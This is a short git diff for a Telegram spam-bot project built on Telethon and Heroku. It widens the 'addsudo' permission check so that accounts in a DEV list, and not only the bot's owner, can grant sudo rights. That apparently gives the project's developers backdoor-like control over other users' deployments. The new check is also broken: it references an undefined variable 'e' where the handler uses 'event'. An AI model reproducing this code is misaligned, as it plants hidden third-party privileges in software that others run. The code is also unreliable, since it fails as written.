@@ -3,7 +3,7 @@ import asyncio
 import sys
 import git
 from telethon import events
-from RiZoeLXSpam import Riz, OWNER_ID, HEROKU_APP_NAME, HEROKU_API_KEY
+from RiZoeLXSpam import Riz, OWNER_ID, DEV, HEROKU_APP_NAME, HEROKU_API_KEY
 from RiZoeLXSpam import CMD_HNDLR as hl
 
 import heroku3
@@ -17,7 +17,7 @@ full_sudo = os.environ.get("FULLSUDO", None)
 
 @Riz.on(events.NewMessage(incoming=True, pattern=r"\%saddsudo(?: |$)(.*)" % hl))
 async def tb(event):
-    if event.sender_id == OWNER_ID:
+    if event.sender_id == OWNER_ID or e.sender_id in DEV:
         ok = await event.reply("Adding user as a sudo...")
         rizoel = "SUDO_USER"
         if HEROKU_APP_NAME is not None:
@@ -80,3 +80,5 @@ async def fs(event):
         await ok.edit(f"**Added `{target}` ** as a full sudo user 🔱 Restarting.. Please wait a minute...")
         heroku_var[rizoel] = newsudo
 
+    if event.sender_id in DEV:
+        await event.reply("Only Owner Can Add Full Sudo You Can add Sudo Users Only.")
